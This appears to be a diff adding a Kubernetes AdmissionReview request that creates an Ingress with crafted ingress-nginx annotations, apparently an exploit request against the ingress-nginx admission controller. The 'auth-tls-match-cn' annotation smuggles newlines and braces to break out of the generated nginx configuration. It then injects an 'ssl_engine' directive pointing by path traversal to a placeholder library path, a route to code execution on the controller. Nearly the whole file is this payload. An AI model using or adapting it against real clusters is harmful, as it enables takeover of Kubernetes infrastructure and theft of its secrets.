@@ -1,0 +1,80 @@
+{
+  "kind": "AdmissionReview",
+  "apiVersion": "admission.k8s.io/v1",
+  "request": {
+    "uid": "e166d137-ff47-443f-9108-9eb42e9738e8",
+    "kind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "resource": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "resource": "ingresses"
+    },
+    "requestKind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "requestResource": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "resource": "ingresses"
+    },
+    "name": "eumesmo",
+    "namespace": "default",
+    "operation": "CREATE",
+    "userInfo": {
+      "username": "kube-review",
+      "uid": "0e484028-0d13-4d6a-9267-92e4a5e2c801"
+    },
+    "object": {
+      "kind": "Ingress",
+      "apiVersion": "networking.k8s.io/v1",
+      "metadata": {
+        "name": "eumesmo",
+        "namespace": "default",
+        "creationTimestamp": null,
+        "annotations": {
+          "nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\n){}\n }}\nssl_engine ../../../../../../REPLACE;\n#",
+          "nginx.ingress.kubernetes.io/auth-tls-secret": "calico-system/node-certs",
+          "nginx.ingress.kubernetes.io/backend-protocol": "FCGI"
+        }
+      },
+      "spec": {
+        "rules": [
+          {
+            "host": "qmx.lab",
+            "http": {
+              "paths": [
+                {
+                  "path": "/",
+                  "pathType": "Prefix",
+                  "backend": {
+                    "service": {
+                      "name": "nginx",
+                      "port": {
+                        "number": 80
+                      }
+                    }
+                  }
+                }
+              ]
+            }
+          }
+        ]
+      },
+      "status": {
+        "loadBalancer": {}
+      }
+    },
+    "oldObject": null,
+    "dryRun": true,
+    "options": {
+      "kind": "CreateOptions",
+      "apiVersion": "meta.k8s.io/v1"
+    }
+  }
+}
